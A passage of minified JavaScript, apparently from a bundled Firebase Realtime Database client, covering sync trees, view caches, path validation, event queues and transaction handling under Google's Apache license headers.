hw(i,e,s),f=e.eventCache.getNode();let p;if(lt(n)||et(n)===".priority"){let v;if(e.serverCache.isFullyInitialized())v=Um(i,Wo(e));else{const b=e.serverCache.getNode();ye(b instanceof He,"serverChildren would be complete if leaf node"),v=uw(i,b)}v=v,p=t.filter.updateFullNode(f,v,o)}else{const v=et(n);let b=dw(i,v,e.serverCache);b==null&&e.serverCache.isCompleteForChild(v)&&(b=f.getImmediateChild(v)),b!=null?p=t.filter.updateChild(f,v,b,Bt(n),d,o):e.eventCache.getNode().hasChild(v)?p=t.filter.updateChild(f,v,He.EMPTY_NODE,Bt(n),d,o):p=f,p.isEmpty()&&e.serverCache.isFullyInitialized()&&(c=Um(i,Wo(e)),c.isLeafNode()&&(p=t.filter.updateFullNode(p,c,o)))}return c=e.serverCache.isFullyInitialized()||Bm(i,Et())!=null,hd(e,p,c,t.filter.filtersNodes())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class MU{constructor(e,n){this.query_=e,this.eventRegistrations_=[];const i=this.query_._queryParams,s=new rw(i.getIndex()),o=XV(i);this.processor_=TU(o);const c=n.serverCache,d=n.eventCache,f=s.updateFullNode(He.EMPTY_NODE,c.getNode(),null),p=o.updateFullNode(He.EMPTY_NODE,d.getNode(),null),v=new Ko(f,c.isFullyInitialized(),s.filtersNodes()),b=new Ko(p,d.isFullyInitialized(),o.filtersNodes());this.viewCache_=Rp(b,v),this.eventGenerator_=new rU(this.query_)}get query(){return this.query_}}function OU(t){return t.viewCache_.serverCache.getNode()}function PU(t,e){const n=Wo(t.viewCache_);return n&&(t.query._queryParams.loadsAllData()||!lt(e)&&!n.getImmediateChild(et(e)).isEmpty())?n.getChild(e):null}function VE(t){return t.eventRegistrations_.length===0}function jU(t,e){t.eventRegistrations_.push(e)}function UE(t,e,n){const i=[];if(n){ye(e==null,"A cancel should cancel all event registrations.");const s=t.query._path;t.eventRegistrations_.forEach(o=>{const c=o.createCancelEvent(n,s);c&&i.push(c)})}if(e){let s=[];for(let o=0;o<t.eventRegistrations_.length;++o){const c=t.eventRegistrations_[o];if(!c.matches(e))s.push(c);else if(e.hasAnyCallback()){s=s.concat(t.eventRegistrations_.slice(o+1));break}}t.eventRegistrations_=s}else t.eventRegistrations_=[];return i}function BE(t,e,n,i){e.type===vr.MERGE&&e.source.queryId!==null&&(ye(Wo(t.viewCache_),"We should always have a full cache before handling merges"),ye(av(t.viewCache_),"Missing event cache, even though we have a server cache"));const s=t.viewCache_,o=SU(t.processor_,s,e,n,i);return CU(t.processor_,o.viewCache),ye(o.viewCache.serverCache.isFullyInitialized()||!s.serverCache.isFullyInitialized(),"Once a server snap is complete, it should never go back"),t.viewCache_=o.viewCache,jN(t,o.changes,o.viewCache.eventCache.getNode(),null)}function LU(t,e){const n=t.viewCache_.eventCache,i=[];return n.getNode().isLeafNode()||n.getNode().forEachChild(Wt,(o,c)=>{i.push(Ec(o,c))}),n.isFullyInitialized()&&i.push(CN(n.getNode())),jN(t,i,n.getNode(),e)}function jN(t,e,n,i){const s=i?[i]:t.eventRegistrations_;return sU(t.eventGenerator_,e,n,s)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Fm;class VU{constructor(){this.views=new Map}}function UU(t){ye(!Fm,"__referenceConstructor has already been defined"),Fm=t}function BU(){return ye(Fm,"Reference.ts has not been loaded"),Fm}function zU(t){return t.views.size===0}function fw(t,e,n,i){const s=e.source.queryId;if(s!==null){const o=t.views.get(s);return ye(o!=null,"SyncTree gave us an op for an invalid query."),BE(o,e,n,i)}else{let o=[];for(const c of t.views.values())o=o.concat(BE(c,e,n,i));return o}}function FU(t,e,n,i,s){const o=e._queryIdentifier,c=t.views.get(o);if(!c){let d=Um(n,s?i:null),f=!1;d?f=!0:i instanceof He?(d=uw(n,i),f=!1):(d=He.EMPTY_NODE,f=!1);const p=Rp(new Ko(d,f,!1),new Ko(i,s,!1));return new MU(e,p)}return c}function HU(t,e,n,i,s,o){const c=FU(t,e,i,s,o);return t.views.has(e._queryIdentifier)||t.views.set(e._queryIdentifier,c),jU(c,n),LU(c,n)}function qU(t,e,n,i){const s=e._queryIdentifier,o=[];let c=[];const d=Wa(t);if(s==="default")for(const[f,p]of t.views.entries())c=c.concat(UE(p,n,i)),VE(p)&&(t.views.delete(f),p.query._queryParams.loadsAllData()||o.push(p.query));else{const f=t.views.get(s);f&&(c=c.concat(UE(f,n,i)),VE(f)&&(t.views.delete(s),f.query._queryParams.loadsAllData()||o.push(f.query)))}return d&&!Wa(t)&&o.push(new(BU())(e._repo,e._path)),{removed:o,events:c}}function LN(t){const e=[];for(const n of t.views.values())n.query._queryParams.loadsAllData()||e.push(n);return e}function lc(t,e){let n=null;for(const i of t.views.values())n=n||PU(i,e);return n}function VN(t,e){if(e._queryParams.loadsAllData())return Ip(t);{const i=e._queryIdentifier;return t.views.get(i)}}function UN(t,e){return VN(t,e)!=null}function Wa(t){return Ip(t)!=null}function Ip(t){for(const e of t.views.values())if(e.query._queryParams.loadsAllData())return e;return null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Hm;function GU(t){ye(!Hm,"__referenceConstructor has already been defined"),Hm=t}function YU(){return ye(Hm,"Reference.ts has not been loaded"),Hm}let QU=1;class zE{constructor(e){this.listenProvider_=e,this.syncPointTree_=new Ut(null),this.pendingWriteTree_=bU(),this.tagToQueryMap=new Map,this.queryToTagMap=new Map}}function BN(t,e,n,i,s){return cU(t.pendingWriteTree_,e,n,i,s),s?Fc(t,new Qo(aw(),e,n)):[]}function KU(t,e,n,i){uU(t.pendingWriteTree_,e,n,i);const s=Ut.fromObject(n);return Fc(t,new Tc(aw(),e,s))}function Da(t,e,n=!1){const i=dU(t.pendingWriteTree_,e);if(hU(t.pendingWriteTree_,e)){let o=new Ut(null);return i.snap!=null?o=o.set(Et(),!0):zn(i.children,c=>{o=o.set(new Ot(c),!0)}),Fc(t,new Vm(i.path,o,n))}else return[]}function kp(t,e,n){return Fc(t,new Qo(ow(),e,n))}function WU(t,e,n){const i=Ut.fromObject(n);return Fc(t,new Tc(ow(),e,i))}function $U(t,e){return Fc(t,new Dd(ow(),e))}function XU(t,e,n){const i=pw(t,n);if(i){const s=gw(i),o=s.path,c=s.queryId,d=yi(o,e),f=new Dd(lw(c),d);return yw(t,o,f)}else return[]}function hv(t,e,n,i,s=!1){const o=e._path,c=t.syncPointTree_.get(o);let d=[];if(c&&(e._queryIdentifier==="default"||UN(c,e))){const f=qU(c,e,n,i);zU(c)&&(t.syncPointTree_=t.syncPointTree_.remove(o));const p=f.removed;if(d=f.events,!s){const v=p.findIndex(w=>w._queryParams.loadsAllData())!==-1,b=t.syncPointTree_.findOnPath(o,(w,E)=>Wa(E));if(v&&!b){const w=t.syncPointTree_.subtree(o);if(!w.isEmpty()){const E=eB(w);for(let C=0;C<E.length;++C){const M=E[C],V=M.query,B=HN(t,M);t.listenProvider_.startListening(md(V),qm(t,V),B.hashFn,B.onComplete)}}}!b&&p.length>0&&!i&&(v?t.listenProvider_.stopListening(md(e),null):p.forEach(w=>{const E=t.queryToTagMap.get(Dp(w));t.listenProvider_.stopListening(md(w),E)}))}tB(t,p)}return d}function ZU(t,e,n,i){const s=pw(t,i);if(s!=null){const o=gw(s),c=o.path,d=o.queryId,f=yi(c,e),p=new Qo(lw(d),f,n);return yw(t,c,p)}else return[]}function JU(t,e,n,i){const s=pw(t,i);if(s){const o=gw(s),c=o.path,d=o.queryId,f=yi(c,e),p=Ut.fromObject(n),v=new Tc(lw(d),f,p);return yw(t,c,v)}else return[]}function FE(t,e,n,i=!1){const s=e._path;let o=null,c=!1;t.syncPointTree_.foreachOnPath(s,(w,E)=>{const C=yi(w,s);o=o||lc(E,C),c=c||Wa(E)});let d=t.syncPointTree_.get(s);d?(c=c||Wa(d),o=o||lc(d,Et())):(d=new VU,t.syncPointTree_=t.syncPointTree_.set(s,d));let f;o!=null?f=!0:(f=!1,o=He.EMPTY_NODE,t.syncPointTree_.subtree(s).foreachChild((E,C)=>{const M=lc(C,Et());M&&(o=o.updateImmediateChild(E,M))}));const p=UN(d,e);if(!p&&!e._queryParams.loadsAllData()){const w=Dp(e);ye(!t.queryToTagMap.has(w),"View does not exist, but we have a tag");const E=nB();t.queryToTagMap.set(w,E),t.tagToQueryMap.set(E,w)}const v=cw(t.pendingWriteTree_,s);let b=HU(d,e,n,v,o,f);if(!p&&!c&&!i){const w=VN(d,e);b=b.concat(iB(t,e,w))}return b}function mw(t,e,n){const s=t.pendingWriteTree_,o=t.syncPointTree_.findOnPath(e,(c,d)=>{const f=yi(c,e),p=lc(d,f);if(p)return p});return kN(s,e,o,n,!0)}function Fc(t,e){return zN(e,t.syncPointTree_,null,cw(t.pendingWriteTree_,Et()))}function zN(t,e,n,i){if(lt(t.path))return FN(t,e,n,i);{const s=e.get(Et());n==null&&s!=null&&(n=lc(s,Et()));let o=[];const c=et(t.path),d=t.operationForChild(c),f=e.children.get(c);if(f&&d){const p=n?n.getImmediateChild(c):null,v=DN(i,c);o=o.concat(zN(d,f,p,v))}return s&&(o=o.concat(fw(s,t,i,n))),o}}function FN(t,e,n,i){const s=e.get(Et());n==null&&s!=null&&(n=lc(s,Et()));let o=[];return e.children.inorderTraversal((c,d)=>{const f=n?n.getImmediateChild(c):null,p=DN(i,c),v=t.operationForChild(c);v&&(o=o.concat(FN(v,d,f,p)))}),s&&(o=o.concat(fw(s,t,i,n))),o}function HN(t,e){const n=e.query,i=qm(t,n);return{hashFn:()=>(OU(e)||He.EMPTY_NODE).hash(),onComplete:s=>{if(s==="ok")return i?XU(t,n._path,i):$U(t,n._path);{const o=W7(s,n);return hv(t,n,null,o)}}}}function qm(t,e){const n=Dp(e);return t.queryToTagMap.get(n)}function Dp(t){return t._path.toString()+"$"+t._queryIdentifier}function pw(t,e){return t.tagToQueryMap.get(e)}function gw(t){const e=t.indexOf("$");return ye(e!==-1&&e<t.length-1,"Bad queryKey."),{queryId:t.substr(e+1),path:new Ot(t.substr(0,e))}}function yw(t,e,n){const i=t.syncPointTree_.get(e);ye(i,"Missing sync point for query tag that we're tracking");const s=cw(t.pendingWriteTree_,e);return fw(i,n,s,null)}function eB(t){return t.fold((e,n,i)=>{if(n&&Wa(n))return[Ip(n)];{let s=[];return n&&(s=LN(n)),zn(i,(o,c)=>{s=s.concat(c)}),s}})}function md(t){return t._queryParams.loadsAllData()&&!t._queryParams.isDefault()?new(YU())(t._repo,t._path):t}function tB(t,e){for(let n=0;n<e.length;++n){const i=e[n];if(!i._queryParams.loadsAllData()){const s=Dp(i),o=t.queryToTagMap.get(s);t.queryToTagMap.delete(s),t.tagToQueryMap.delete(o)}}}function nB(){return QU++}function iB(t,e,n){const i=e._path,s=qm(t,e),o=HN(t,n),c=t.listenProvider_.startListening(md(e),s,o.hashFn,o.onComplete),d=t.syncPointTree_.subtree(i);if(s)ye(!Wa(d.value),"If we're adding a query, it shouldn't be shadowed");else{const f=d.fold((p,v,b)=>{if(!lt(p)&&v&&Wa(v))return[Ip(v).query];{let w=[];return v&&(w=w.concat(LN(v).map(E=>E.query))),zn(b,(E,C)=>{w=w.concat(C)}),w}});for(let p=0;p<f.length;++p){const v=f[p];t.listenProvider_.stopListening(md(v),qm(t,v))}}return c}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vw{constructor(e){this.node_=e}getImmediateChild(e){const n=this.node_.getImmediateChild(e);return new vw(n)}node(){return this.node_}}class _w{constructor(e,n){this.syncTree_=e,this.path_=n}getImmediateChild(e){const n=Kt(this.path_,e);return new _w(this.syncTree_,n)}node(){return mw(this.syncTree_,this.path_)}}const rB=function(t){return t=t||{},t.timestamp=t.timestamp||new Date().getTime(),t},HE=function(t,e,n){if(!t||typeof t!="object")return t;if(ye(".sv"in t,"Unexpected leaf node or priority contents"),typeof t[".sv"]=="string")return sB(t[".sv"],e,n);if(typeof t[".sv"]=="object")return aB(t[".sv"],e);ye(!1,"Unexpected server value: "+JSON.stringify(t,null,2))},sB=function(t,e,n){switch(t){case"timestamp":return n.timestamp;default:ye(!1,"Unexpected server value: "+t)}},aB=function(t,e,n){t.hasOwnProperty("increment")||ye(!1,"Unexpected server value: "+JSON.stringify(t,null,2));const i=t.increment;typeof i!="number"&&ye(!1,"Unexpected increment value: "+i);const s=e.node();if(ye(s!==null&&typeof s<"u","Expected ChildrenNode.EMPTY_NODE for nulls"),!s.isLeafNode())return i;const c=s.getValue();return typeof c!="number"?i:c+i},qN=function(t,e,n,i){return ww(e,new _w(n,t),i)},GN=function(t,e,n){return ww(t,new vw(e),n)};function ww(t,e,n){const i=t.getPriority().val(),s=HE(i,e.getImmediateChild(".priority"),n);let o;if(t.isLeafNode()){const c=t,d=HE(c.getValue(),e,n);return d!==c.getValue()||s!==c.getPriority().val()?new En(d,Sn(s)):t}else{const c=t;return o=c,s!==c.getPriority().val()&&(o=o.updatePriority(new En(s))),c.forEachChild(Wt,(d,f)=>{const p=ww(f,e.getImmediateChild(d),n);p!==f&&(o=o.updateImmediateChild(d,p))}),o}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bw{constructor(e="",n=null,i={children:{},childCount:0}){this.name=e,this.parent=n,this.node=i}}function xw(t,e){let n=e instanceof Ot?e:new Ot(e),i=t,s=et(n);for(;s!==null;){const o=fc(i.node.children,s)||{children:{},childCount:0};i=new bw(s,i,o),n=Bt(n),s=et(n)}return i}function Hc(t){return t.node.value}function YN(t,e){t.node.value=e,fv(t)}function QN(t){return t.node.childCount>0}function oB(t){return Hc(t)===void 0&&!QN(t)}function Mp(t,e){zn(t.node.children,(n,i)=>{e(new bw(n,t,i))})}function KN(t,e,n,i){n&&e(t),Mp(t,s=>{KN(s,e,!0)})}function lB(t,e,n){let i=t.parent;for(;i!==null;){if(e(i))return!0;i=i.parent}return!1}function nh(t){return new Ot(t.parent===null?t.name:nh(t.parent)+"/"+t.name)}function fv(t){t.parent!==null&&cB(t.parent,t.name,t)}function cB(t,e,n){const i=oB(n),s=ns(t.node.children,e);i&&s?(delete t.node.children[e],t.node.childCount--,fv(t)):!i&&!s&&(t.node.children[e]=n.node,t.node.childCount++,fv(t))}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const uB=/[\[\].#$\/\u0000-\u001F\u007F]/,dB=/[\[\].#$\u0000-\u001F\u007F]/,y0=10*1024*1024,Aw=function(t){return typeof t=="string"&&t.length!==0&&!uB.test(t)},WN=function(t){return typeof t=="string"&&t.length!==0&&!dB.test(t)},hB=function(t){return t&&(t=t.replace(/^\/*\.info(\/|$)/,"/")),WN(t)},fB=function(t){return t===null||typeof t=="string"||typeof t=="number"&&!W_(t)||t&&typeof t=="object"&&ns(t,".sv")},$N=function(t,e,n,i){i&&e===void 0||Op(tp(t,"value"),e,n)},Op=function(t,e,n){const i=n instanceof Ot?new RV(n,t):n;if(e===void 0)throw new Error(t+"contains undefined "+Do(i));if(typeof e=="function")throw new Error(t+"contains a function "+Do(i)+" with contents = "+e.toString());if(W_(e))throw new Error(t+"contains "+e.toString()+" "+Do(i));if(typeof e=="string"&&e.length>y0/3&&np(e)>y0)throw new Error(t+"contains a string greater than "+y0+" utf8 bytes "+Do(i)+" ('"+e.substring(0,50)+"...')");if(e&&typeof e=="object"){let s=!1,o=!1;if(zn(e,(c,d)=>{if(c===".value")s=!0;else if(c!==".priority"&&c!==".sv"&&(o=!0,!Aw(c)))throw new Error(t+" contains an invalid key ("+c+") "+Do(i)+`.  Keys must be non-empty strings and can't contain ".", "#", "$", "/", "[", or "]"`);IV(i,c),Op(t,d,i),kV(i)}),s&&o)throw new Error(t+' contains ".value" child '+Do(i)+" in addition to actual children.")}},mB=function(t,e){let n,i;for(n=0;n<e.length;n++){i=e[n];const o=Nd(i);for(let c=0;c<o.length;c++)if(!(o[c]===".priority"&&c===o.length-1)){if(!Aw(o[c]))throw new Error(t+"contains an invalid key ("+o[c]+") in path "+i.toString()+`. Keys must be non-empty strings and can't contain ".", "#", "$", "/", "[", or "]"`)}}e.sort(NV);let s=null;for(n=0;n<e.length;n++){if(i=e[n],s!==null&&sr(s,i))throw new Error(t+"contains a path "+s.toString()+" that is ancestor of another path "+i.toString());s=i}},pB=function(t,e,n,i){const s=tp(t,"values");if(!(e&&typeof e=="object")||Array.isArray(e))throw new Error(s+" must be an object containing the children to replace.");const o=[];zn(e,(c,d)=>{const f=new Ot(c);if(Op(s,d,Kt(n,f)),ew(f)===".priority"&&!fB(d))throw new Error(s+"contains an invalid value for '"+f.toString()+"', which must be a valid Firebase priority (a string, finite number, server value, or null).");o.push(f)}),mB(s,o)},XN=function(t,e,n,i){if(!WN(n))throw new Error(tp(t,e)+'was an invalid path = "'+n+`". Paths must be non-empty strings and can't contain ".", "#", "$", "[", or "]"`)},gB=function(t,e,n,i){n&&(n=n.replace(/^\/*\.info(\/|$)/,"/")),XN(t,e,n)},ZN=function(t,e){if(et(e)===".info")throw new Error(t+" failed = Can't modify data under /.info/")},yB=function(t,e){const n=e.path.toString();if(typeof e.repoInfo.host!="string"||e.repoInfo.host.length===0||!Aw(e.repoInfo.namespace)&&e.repoInfo.host.split(":")[0]!=="localhost"||n.length!==0&&!hB(n))throw new Error(tp(t,"url")+`must be a valid firebase URL and the path can't contain ".", "#", "$", "[", or "]".`)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vB{constructor(){this.eventLists_=[],this.recursionDepth_=0}}function Pp(t,e){let n=null;for(let i=0;i<e.length;i++){const s=e[i],o=s.getPath();n!==null&&!tw(o,n.path)&&(t.eventLists_.push(n),n=null),n===null&&(n={events:[],path:o}),n.events.push(s)}n&&t.eventLists_.push(n)}function JN(t,e,n){Pp(t,n),eR(t,i=>tw(i,e))}function br(t,e,n){Pp(t,n),eR(t,i=>sr(i,e)||sr(e,i))}function eR(t,e){t.recursionDepth_++;let n=!0;for(let i=0;i<t.eventLists_.length;i++){const s=t.eventLists_[i];if(s){const o=s.path;e(o)?(_B(t.eventLists_[i]),t.eventLists_[i]=null):n=!1}}n&&(t.eventLists_=[]),t.recursionDepth_--}function _B(t){for(let e=0;e<t.events.length;e++){const n=t.events[e];if(n!==null){t.events[e]=null;const i=n.getEventRunner();ud&&Vn("event: "+n.toString()),zc(i)}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wB="repo_interrupt",bB=25;class xB{constructor(e,n,i,s){this.repoInfo_=e,this.forceRestClient_=n,this.authTokenProvider_=i,this.appCheckProvider_=s,this.dataUpdateCount=0,this.statsListener_=null,this.eventQueue_=new vB,this.nextWriteId_=1,this.interceptServerDataCallback_=null,this.onDisconnect_=Lm(),this.transactionQueueTree_=new bw,this.persistentConnection_=null,this.key=this.repoInfo_.toURLString()}toString(){return(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host}}function AB(t,e,n){if(t.stats_=Z_(t.repoInfo_),t.forceRestClient_||J7())t.server_=new jm(t.repoInfo_,(i,s,o,c)=>{qE(t,i,s,o,c)},t.authTokenProvider_,t.appCheckProvider_),setTimeout(()=>GE(t,!0),0);else{if(typeof n<"u"&&n!==null){if(typeof n!="object")throw new Error("Only objects are supported for option databaseAuthVariableOverride");try{Nn(n)}catch(i){throw new Error("Invalid authOverride provided: "+i)}}t.persistentConnection_=new js(t.repoInfo_,e,(i,s,o,c)=>{qE(t,i,s,o,c)},i=>{GE(t,i)},i=>{EB(t,i)},t.authTokenProvider_,t.appCheckProvider_,n),t.server_=t.persistentConnection_}t.authTokenProvider_.addTokenChangeListener(i=>{t.server_.refreshAuthToken(i)}),t.appCheckProvider_.addTokenChangeListener(i=>{t.server_.refreshAppCheckToken(i.token)}),t.statsReporter_=rV(t.repoInfo_,()=>new iU(t.stats_,t.server_)),t.infoData_=new ZV,t.infoSyncTree_=new zE({startListening:(i,s,o,c)=>{let d=[];const f=t.infoData_.getNode(i._path);return f.isEmpty()||(d=kp(t.infoSyncTree_,i._path,f),setTimeout(()=>{c("ok")},0)),d},stopListening:()=>{}}),Ew(t,"connected",!1),t.serverSyncTree_=new zE({startListening:(i,s,o,c)=>(t.server_.listen(i,o,s,(d,f)=>{const p=c(d,f);br(t.eventQueue_,i._path,p)}),[]),stopListening:(i,s)=>{t.server_.unlisten(i,s)}})}function tR(t){const n=t.infoData_.getNode(new Ot(".info/serverTimeOffset")).val()||0;return new Date().getTime()+n}function jp(t){return rB({timestamp:tR(t)})}function qE(t,e,n,i,s){t.dataUpdateCount++;const o=new Ot(e);n=t.interceptServerDataCallback_?t.interceptServerDataCallback_(e,n):n;let c=[];if(s)if(i){const f=hm(n,p=>Sn(p));c=JU(t.serverSyncTree_,o,f,s)}else{const f=Sn(n);c=ZU(t.serverSyncTree_,o,f,s)}else if(i){const f=hm(n,p=>Sn(p));c=WU(t.serverSyncTree_,o,f)}else{const f=Sn(n);c=kp(t.serverSyncTree_,o,f)}let d=o;c.length>0&&(d=Sc(t,o)),br(t.eventQueue_,d,c)}function GE(t,e){Ew(t,"connected",e),e===!1&&SB(t)}function EB(t,e){zn(e,(n,i)=>{Ew(t,n,i)})}function Ew(t,e,n){const i=new Ot("/.info/"+e),s=Sn(n);t.infoData_.updateSnapshot(i,s);const o=kp(t.infoSyncTree_,i,s);br(t.eventQueue_,i,o)}function Tw(t){return t.nextWriteId_++}function TB(t,e,n,i,s){Lp(t,"set",{path:e.toString(),value:n,priority:i});const o=jp(t),c=Sn(n,i),d=mw(t.serverSyncTree_,e),f=GN(c,d,o),p=Tw(t),v=BN(t.serverSyncTree_,e,f,p,!0);Pp(t.eventQueue_,v),t.server_.put(e.toString(),c.val(!0),(w,E)=>{const C=w==="ok";C||oi("set at "+e+" failed: "+w);const M=Da(t.serverSyncTree_,p,!C);br(t.eventQueue_,e,M),mv(t,s,w,E)});const b=Sw(t,e);Sc(t,b),br(t.eventQueue_,b,[])}function CB(t,e,n,i){Lp(t,"update",{path:e.toString(),value:n});let s=!0;const o=jp(t),c={};if(zn(n,(d,f)=>{s=!1,c[d]=qN(Kt(e,d),Sn(f),t.serverSyncTree_,o)}),s)Vn("update() called with empty data.  Don't do anything."),mv(t,i,"ok",void 0);else{const d=Tw(t),f=KU(t.serverSyncTree_,e,c,d);Pp(t.eventQueue_,f),t.server_.merge(e.toString(),n,(p,v)=>{const b=p==="ok";b||oi("update at "+e+" failed: "+p);const w=Da(t.serverSyncTree_,d,!b),E=w.length>0?Sc(t,e):e;br(t.eventQueue_,E,w),mv(t,i,p,v)}),zn(n,p=>{const v=Sw(t,Kt(e,p));Sc(t,v)}),br(t.eventQueue_,e,[])}}function SB(t){Lp(t,"onDisconnectEvents");const e=jp(t),n=Lm();sv(t.onDisconnect_,Et(),(s,o)=>{const c=qN(s,o,t.serverSyncTree_,e);SN(n,s,c)});let i=[];sv(n,Et(),(s,o)=>{i=i.concat(kp(t.serverSyncTree_,s,o));const c=Sw(t,s);Sc(t,c)}),t.onDisconnect_=Lm(),br(t.eventQueue_,Et(),i)}function NB(t,e,n){let i;et(e._path)===".info"?i=FE(t.infoSyncTree_,e,n):i=FE(t.serverSyncTree_,e,n),JN(t.eventQueue_,e._path,i)}function nR(t,e,n){let i;et(e._path)===".info"?i=hv(t.infoSyncTree_,e,n):i=hv(t.serverSyncTree_,e,n),JN(t.eventQueue_,e._path,i)}function RB(t){t.persistentConnection_&&t.persistentConnection_.interrupt(wB)}function Lp(t,...e){let n="";t.persistentConnection_&&(n=t.persistentConnection_.id+":"),Vn(n,...e)}function mv(t,e,n,i){e&&zc(()=>{if(n==="ok")e(null);else{const s=(n||"error").toUpperCase();let o=s;i&&(o+=": "+i);const c=new Error(o);c.code=s,e(c)}})}function iR(t,e,n){return mw(t.serverSyncTree_,e,n)||He.EMPTY_NODE}function Cw(t,e=t.transactionQueueTree_){if(e||Vp(t,e),Hc(e)){const n=sR(t,e);ye(n.length>0,"Sending zero length transaction queue"),n.every(s=>s.status===0)&&IB(t,nh(e),n)}else QN(e)&&Mp(e,n=>{Cw(t,n)})}function IB(t,e,n){const i=n.map(p=>p.currentWriteId),s=iR(t,e,i);let o=s;const c=s.hash();for(let p=0;p<n.length;p++){const v=n[p];ye(v.status===0,"tryToSendTransactionQueue_: items in queue should all be run."),v.status=1,v.retryCount++;const b=yi(e,v.path);o=o.updateChild(b,v.currentOutputSnapshotRaw)}const d=o.val(!0),f=e;t.server_.put(f.toString(),d,p=>{Lp(t,"transaction put response",{path:f.toString(),status:p});let v=[];if(p==="ok"){const b=[];for(let w=0;w<n.length;w++)n[w].status=2,v=v.concat(Da(t.serverSyncTree_,n[w].currentWriteId)),n[w].onComplete&&b.push(()=>n[w].onComplete(null,!0,n[w].currentOutputSnapshotResolved)),n[w].unwatcher();Vp(t,xw(t.transactionQueueTree_,e)),Cw(t,t.transactionQueueTree_),br(t.eventQueue_,e,v);for(let w=0;w<b.length;w++)zc(b[w])}else{if(p==="datastale")for(let b=0;b<n.length;b++)n[b].status===3?n[b].status=4:n[b].status=0;else{oi("transaction at "+f.toString()+" failed: "+p);for(let b=0;b<n.length;b++)n[b].status=4,n[b].abortReason=p}Sc(t,e)}},c)}function Sc(t,e){const n=rR(t,e),i=nh(n),s=sR(t,n);return kB(t,s,i),i}function kB(t,e,n){if(e.length===0)return;const i=[];let s=[];const c=e.filter(d=>d.status===0).map(d=>d.currentWriteId);for(let d=0;d<e.length;d++){const f=e[d],p=yi(n,f.path);let v=!1,b;if(ye(p!==null,"rerunTransactionsUnderNode_: relativePath should not be null."),f.status===4)v=!0,b=f.abortReason,s=s.concat(Da(t.serverSyncTree_,f.currentWriteId,!0));else if(f.status===0)if(f.retryCount>=bB)v=!0,b="maxretry",s=s.concat(Da(t.serverSyncTree_,f.currentWriteId,!0));else{const w=iR(t,f.path,c);f.currentInputSnapshot=w;const E=e[d].update(w.val());if(E!==void 0){Op("transaction failed: Data returned ",E,f.path);let C=Sn(E);typeof E=="object"&&E!=null&&ns(E,".priority")||(C=C.updatePriority(w.getPriority()));const V=f.currentWriteId,B=jp(t),Y=GN(C,w,B);f.currentOutputSnapshotRaw=C,f.currentOutputSnapshotResolved=Y,f.currentWriteId=Tw(t),c.splice(c.indexOf(V),1),s=s.concat(BN(t.serverSyncTree_,f.path,Y,f.currentWriteId,f.applyLocally)),s=s.concat(Da(t.serverSyncTree_,V,!0))}else 